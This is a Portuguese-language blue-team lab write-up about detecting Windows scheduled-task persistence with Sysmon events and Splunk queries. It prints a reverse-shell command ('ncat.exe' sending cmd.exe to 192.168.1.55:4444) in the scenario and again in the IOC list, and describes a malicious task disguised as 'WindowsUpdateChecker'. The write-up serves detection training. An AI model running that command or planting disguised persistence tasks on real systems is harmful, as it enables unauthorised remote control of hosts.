# Lab 01 — Persistência via Scheduled Task

## Objetivo

Detectar uma tentativa de persistência via Scheduled Task em ambiente Windows.

## Cenário Geral

Um atacante obteve acesso inicial ao host e executa tentativas de estabelecer persistência.
Para isto, ele faz upload do `ncat.exe` em `C:\` e cria uma tarefa agendada chamada:
 

```powershell
WindowsUpdateChecker
```

que executa:

```powershell

powershell -C "C:\ncat.exe 192.168.1.55 4444 -e C:\Windows\System32\cmd.exe"
```

iniciando uma reverse shell pelo cmd.exe. 
Existem 2 principais formas de criar uma tarefa de persistência, e por isto, separei a investigação em 2 subcenários.

## Sub-Cenário 1

### Execução

Para criar a tarefa, o invasor utilizou a interface gráfica do Task Scheduler, o “*taskchd.msc*”:

<img width="691" height="253" alt="image" src="https://github.com/user-attachments/assets/1d2ea33f-fe7a-4904-ac1e-020a63b32fc1" />
<img width="692" height="287" alt="image" src="https://github.com/user-attachments/assets/7fb25aae-1ac7-4938-ad69-44664e71a62c" />
<img width="692" height="253" alt="image" src="https://github.com/user-attachments/assets/ea6c0a8a-1c9a-45d0-89d0-6daf1da23613" />
<img width="684" height="169" alt="image" src="https://github.com/user-attachments/assets/1eb33fd7-0460-4676-bbc9-d0a5c2565f24" />

### Telemetria Gerada

#### Sysmon Event 1:

Iniciar o taskschd.msc gera o evento de ID 1 pelo Sysmon, apontando a criação deste processo. Para confirmar o início deste processo filtrei no Splunk os logs pelos que contêm EventID 1 e a substring “taskschd.msc”:

<img width="1343" height="289" alt="image" src="https://github.com/user-attachments/assets/352c5559-89ef-444d-9cd8-0b31078fa55c" />
<img width="953" height="91" alt="image" src="https://github.com/user-attachments/assets/066d426a-59d6-4041-bf7c-c7c4af333f8b" />

#### Sysmon Event 11:

O segundo evento gerado é a criação de um arquivo sem extensão dentro de “C:\Windows\System32\Tasks”, simbolizando a criação da tarefa:

<img width="832" height="136" alt="image" src="https://github.com/user-attachments/assets/84a5a8fd-24a5-4afb-a44b-a73d821af35f" />

## Investigação

### Quem criou?

Uma análise do primeiro log do Sysmon revela o usuário utilizado para executar o Task Scheduler, no campo “User”, que é o usuário “JohnDoe”:

<img width="813" height="151" alt="image" src="https://github.com/user-attachments/assets/e1192453-a690-4fa0-9e46-b039e37e9a47" />

### Quando criou?

A criação efetiva da tarefa se dá pela criação do arquivo em C:\Windows\System32\Tasks, e o segundo log mostra o timestamp exato da criação em 03/06/2026 às 00:55:29:

<img width="87" height="92" alt="image" src="https://github.com/user-attachments/assets/6a72d963-8490-4996-860c-42f555384c9f" />

### Qual payload será executado?

Sabendo o caminho exato do arquivo que armazena as informações da tarefa agendada, abri-lo será um forte ponto de partida para analisar o payload. Escolhi o VSCode como editor, pois apesar de não ter extensões o arquivo está em formato XML. 
A tag <Exec> mostra que uma reverse shell para *192.168.1.55:4444* será iniciada utilizando o *ncat.exe*:

<img width="1085" height="419" alt="image" src="https://github.com/user-attachments/assets/85bf2f0d-db22-4c9c-9979-75df3caa759d" />

### Quando será executado?

O mesmo arquivo também exibe que a tarefa será disparada em todo logon do usuário JohnDoe:

<img width="662" height="345" alt="image" src="https://github.com/user-attachments/assets/9c5feecf-9d6a-46c5-823c-37cfcc743d2f" />

## Oportunidades de Detecção

- Criação de tarefa contendo `ncat.exe` em seu arquivo. Extremamente suspeito e incomum para tarefas cotidianas ou criadas por um usuário legítimo do sistema.
- Conexão para 192.168.1.55:4444. Porta incomum para serviços de rede, mas comum em ataques e reverse shells.
- Criação de arquivo em `C:\Windows\System32\Tasks\` . Monitorar a criação de arquivos dentro desta pasta é fundamental para detectar com máxima eficiência e antecedência a criação de tarefas.

## Indicadores de Comprometimento (IOCs)

- **IP do invasor**: 192.168.1.55
- **Arquivo**: C:\ncat.exe
- **Task**: WindowsUpdateChecker
- **Processo**: powershell.exe
- **Reverse Shell Script**:
    
    ```powershell
     powershell -C “ncat.exe 192.168.1.55 4444 -e C:\Windows\System32\cmd.exe
    ```
    

## Queries SPL

- Procurar início de *taskschd.msc:*
    
    ```powershell
    sourcetype="XmlWinEventLog" EventID=1 CommandLine="*taskschd.msc*"
    ```
    
- Procurar criação de arquivos em C:\Windows\System32\Tasks:
    
    ```powershell
    sourcetype="XmlWinEventLog" EventID=11 | search TargetFilename="C:\\Windows\\System32\\Tasks*" 
    ```
    

---

## ATT&CK

- T1053.005
- T1059.001

## Falsos Positivos

- O serviço svchost inicia e cria novas tarefas frequentemente. É útil remover estas atividades comuns do sistema durante a busca em SPL.
- Tarefas agendadas legitimamente pelo usuário devem ser identificadas como tal, durante a análise do payload.

---

## Conclusão

O Sysmon e o Splunk são duas ótimas ferramentas para abstrair, em poucos logs, o evento de criação de uma tarefa agendada. Com eles podemos traçar o momento, payload e frequência de ativação da tarefa, possibilitando ações posteriores de threat hunting e incident response ao ataque.

## Sub-Cenário 2 [Em Breve]
